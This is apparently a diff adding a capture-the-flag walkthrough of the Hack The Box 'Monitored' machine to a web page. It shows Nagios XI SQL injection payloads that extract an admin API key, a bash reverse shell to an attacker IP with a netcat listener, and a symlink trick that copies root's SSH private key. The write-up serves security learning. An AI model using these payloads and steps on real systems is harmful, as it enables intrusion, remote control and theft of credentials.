@@ -168,6 +168,70 @@ So it reaches from 5.11.0 up to and including 5.11.1 according to NIST, and it a
 First, I'm going to exploit this flaw manually.
 
 I hop back into Burp and modify the request as follows:</p>
+           <p>`POST /nagiosxi/api/v1/authenticate` becomes `POST /nagiosxi/admin/banner_message-ajaxhelper.php`.
+
+`username=svc&password=XjH7VCehowpR1xZB` becomes `action=acknowledge_banner_message&id=EXPLOIT` ("EXPLOIT" is just filler text here). I send it and the server returns this:
+
+So, I know for sure that an SQL injection problem exists here, but how do I actually extract important data from the server?
+
+Sending `action=acknowledge_banner_message&id=1 AND EXTRACTVALUE(1,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA))` to the server results in the message:</p>
+           <p></p>
+           <p>Next is database enumeration. Sending `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA)))` gives me two databases in the response: "information_schema" and "nagiosxi". To access the columns, I use `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(TABLE_NAME,":",COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'nagiosxi')))`, which gives me a limited amount of information. Not enough that it's useful.
+
+I then use `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'nagiosxi' LIMIT 0,1)))`, with this, I can go through a list of tables by modifying `LIMIT 0,1` to different numbers. For example: `LIMIT 0,1` returns `xi_deploy_agents` in the server response. `LIMIT 3,1` returns `xi_mibs` in the server response. `LIMIT 7,1` returns `xi_usermeta` in the server response. You get the idea.
+
+This process can be sped up using the Intruder module of Burp. I send the Repeater request to Intruder using ctrl + I. Inside Intruder, the "0" in `LIMIT 0,1` will act as the 'payload' (denoted when between '§' symbols), and thus Intruder will automate the changing of 0 to other numbers so that we can speed up enumeration.
+
+The payload type can be changed to numbers only under the "Payload type:" menu. I set the number range from 0 to 40 in the "Payload configuration" section. Then I start the attack.
+
+When analyzing the results, I keep in mind that as an attacker, I'm hunting for the xi_users table, as that will contain an admin account. The 16th payload (`action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'nagiosxi' LIMIT 16,1)))`) gives us the response `SQL Error [nagiosxi] : XPATH syntax error: 'xi_users'` which tells me the name of the table that contains the information I need to find the API key for the admin user. I send this to the Repeater module.
+
+Back to the Repeater module, I modify my request with `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'nagiosxi' and TABLE_NAME = 'xi_users' LIMIT 0,1)))`. Once again, I send this to the Intruder module so that I can check what the `xi_users` table contains this time around.
+
+Among the requests, the ones that stand out to me are `username`, `password`, `api_key`!!!, and `api_enabled`. Now, to get the juicy data, I run modify my request to contain `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select username from xi_users LIMIT 0,1)))`, and from the server's response, I get `nagiosadmin`. Switching to `api_key`, I get `IudGPHd9pEKiee9MkJ7ggPD89q3Y...`. Darn! The full key isn't readable from here. I'm going to try finding a password to log in as nagiosadmin, and maybe a key is in there.</p>
+           <p>Sadly, I can't get the full password hash:</p>
+           <p>On a side note: `select username from xi_users LIMIT 1,1` reveals in the response the svc user I hijacked to log in.</p>
+           <p>To get the full hashes, I can use `substring`. In the case of the API:</p>
+           <p>`action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select substring(api_key,29,56) from xi_users LIMIT 0,1)))` will give us the next sequence of characters to combine with `IudGPHd9pEKiee9MkJ7ggPD89q3Y`. After combining each sequence, I should have the full hash. Logically, I move on to `57,150` to get the next sequence, giving me the last bit. The final hash is `IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`!</p>
+           <p>I now have to find an older exploit PoC that should tell me the API endpoint used for creating a new user in Nagios XI. In my search, I found CVE-2024-24401. The code should give me an idea of where to find the API and how to structure the parameters. I craft it as follows:</p>
+           <p>Notice I pasted in the API key obtained earlier, and the bogus parameters stuffed into the request at the bottom.</p>
+           <p>About auth_level: ???</p>
+           <p>And with that, my account "hacker" was created, and now I can log in to Nagios XI at admin level. And...I'M IN!:</p>
+           <p>(A terrible username if you're trying to remain undetected on the target, BTW.)
+
+Just as I got admin access, the machine ran out of time. I start it again and it now has an IP address of 10.129.144.63. I now have to repeat some of the steps to get in again.
+
+Ok, I'm back.
+
+Here you can see the users. There's also a page ("Command Management") that lists commands, and allows the user to add new commands. Here I have the opportunity to plant a reverse shell on the host using `bash -c 'bash -i >& /dev/tcp/[attacker's IP]/9001 0>&1'`. By executing this, I should receive a TCP connection on port 9001 from the target machine. From there, I can execute desired commands.
+
+I hit "Save", then apply the configuration with my reverse shell now included. Then, from the Core Config Manager, I select Services, add a new check, which is the reverse shell. Before hitting "Run Check Command", I create a TCP listener on my machine so that I can receive the reverse shell connection. It's as easy as `nc -lvnp 9001`, where `nc` is for netcat, the famous networking tool for reading and writing from TCP and UDP connections, `l` for listening for inbound connections, `v` for verbose mode (more information), `n` for numeric-only IP addresses, and `p` for the local port we want to listen on (9001 in this case).
+
+BAM! I'm connected:</p>
+           <p>The user flag is right there for me to take.
+
+I use `sudo -l` to enumerate the sudo configuration for the nagios user. In other words, I'm finding out how many commands the nagios user can run as root with `sudo`, as you can see here:</p>
+           <p>The `getprofile.sh` script itself collects and consolidates logs and configuration files into a profile directory that's specified by the user. The script expects either a directory name or identifier to store the profile. The danger here (for the target) is that the script is vulnerable to a symbolic link attack, meaning that a malicious user (me) could create a symbolic link (symlink) named phpmailer.log which points to a sensitive file. This is dangerous because, when the script executes, it'd follow the symlink and copy sensitive data into an accessible directory. I verify access to the phpmailer.log so that I can execute the symbolic link attack:</p>
+           <p>The log file doesn't currently exist, but I have write permissions to its parent directory. I proceed to check the SSH configuration to see if authentication as root is enabled, and also if PubkeyAuthentication is enabled. PubkeyAuthentication specifies whether public key authentication is allowed or not, and the default is yes.
+
+If the user has a private key in their .ssh directory, I can use it to authenticate.
+
+As for actually exploiting this scenario, I start by creating the symlink named `phpmailer.log` in the /usr/local/nagiosxi/tmp/ directory:
+
+`ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log`
+
+`ln` is the link command in Linux, and it creates links between files. By default, `ln` creates hard links, but by using the `-s` option, symbolic (soft) links can be created. As stated, the `-s` flag tells `ln` to create a symbolic (soft) link. For context, a symbolic link is similar to a shortcut or alias to another file or directory. The actual content is not copied; the symbolic link just points to the original location.
+
+`/root/.ssh/id_rsa` is the source file. In this case, it points to the private SSH key file (`id_rsa`), which is located in the `.ssh` directory under the root user's home directory (`/root/.ssh/`). `id_rsa` is a private key used for SSH authentication. The destination path is `/usr/local/nagiosxi/tmp/phpmailer.log`, so the symbolic link is being created at that location. So, the symbolic link will appear as `phpmailer.log` in that directory, but it'll actually point to the `id_rsa` file.
+
+The command will allow me to reference a different file (the SSH private key), using the symbolic link. This is a nice method for privilege escalation.
+
+I run the script using `sudo ./getprofile.sh 1`, which follows the malicious symlink and copies the contents of root's SSH private key into the profile folder I control. In this case, profile-1739325883:</p>
+           <p>I cd into profile-1739325883, list the contents, and `cat phpmailer.log`, where the maliciously-gotten private key is stored. I save it to my machine as `id_rsa`, apply 600 permissions to the file using `chmod 600 id_rsa`, and finally break into the Monitored box as root, where the last flag is located. Why 600? Well, with the command, I'm modifying the file permissions 
+
+This was an extremely fun—at times utterly frustrating box—to complete. I wanted more of a challenge and I got exactly that and more.
+
+With that out of the way, I wanted to take this opportunity to practice automatic SQLi using sqlmap, so I'm going to rewind to the part where I'm trying to get the API key.</p>
            <p></p>
         <script>
          window.addEventListener('DOMContentLoaded', (event) => {
